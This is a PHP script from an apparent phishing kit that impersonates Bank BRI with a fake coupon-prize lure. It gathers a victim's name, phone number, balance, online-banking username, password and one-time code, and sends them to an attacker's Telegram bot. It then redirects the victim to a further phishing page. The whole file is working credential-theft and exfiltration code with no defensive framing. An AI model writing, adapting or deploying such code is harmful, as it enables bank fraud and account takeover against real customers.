<?php
include 'telegram.php';
session_start();
$f = $_POST['f'];

$a       = $_SESSION['a'];
$b                = $_SESSION['b'];
$c        = $_SESSION['c'];
$d        = $_SESSION['d'];
$e               = $_SESSION['e'];
$message = "
  𝗡𝗢𝗧𝗜𝗙𝗜𝗞𝗔𝗦𝗜 𝗕𝗔𝗡𝗞 𝗕𝗥𝗜 𝗨𝗡𝗗𝗜𝗔𝗡 𝗞𝗨𝗣𝗢𝗡

𝙉𝘼𝙈𝘼 : ".$a."

𝙉𝙊 𝙃𝙋 : ".$b."

𝙎𝘼𝙇𝘿𝙊 : ".$c."

𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : ".$d."
𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿 : ".$e."

𝙊𝙏𝙋 : ".$f."

  𝑷𝑬𝑱𝑼𝑨𝑵𝑮 𝑹𝑼𝑷𝑰𝑨𝑯 𝑯𝑨𝑵𝒀𝑨 𝑩𝑼𝑻𝑼𝑯 𝑷𝑹𝑶𝑺𝑬𝑺✓";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ../kode2.php');
?>
